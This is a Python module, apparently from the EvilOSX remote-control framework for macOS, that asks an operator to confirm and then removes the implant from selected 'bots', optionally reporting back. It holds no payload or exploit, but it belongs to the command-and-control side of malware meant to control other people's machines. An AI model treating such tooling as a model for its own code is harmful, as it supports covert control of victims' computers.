# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self) -> dict:
        return {
            "Author:": ["Marten4n6"],
            "Description": "Remove EvilOSX from the bot.",
            "References": [],
            "Stoppable": False
        }

    def setup(self) -> Tuple[bool, Optional[dict]]:
        confirm = self._view.prompt("Are you sure you want to continue? [y/N]: ", [
            ("You are about to remove EvilOSX from the bot(s).", "attention")
        ]).lower()

        should_notify = self._view.prompt("Notify when the bot is removed? [y/N]: ").lower()
        if should_notify == "y":
            should_notify = True
        else:
            should_notify = False

        if not confirm or confirm == "n":
            return False, None
        else:
            return True, {
                "response_options":
                    {"should_notify": should_notify}
            }

    def process_response(self, response: bytes, response_options: dict):
        if response_options["should_notify"]:
            self._view.output_separator()
            self._view.output(response.decode(), "info")

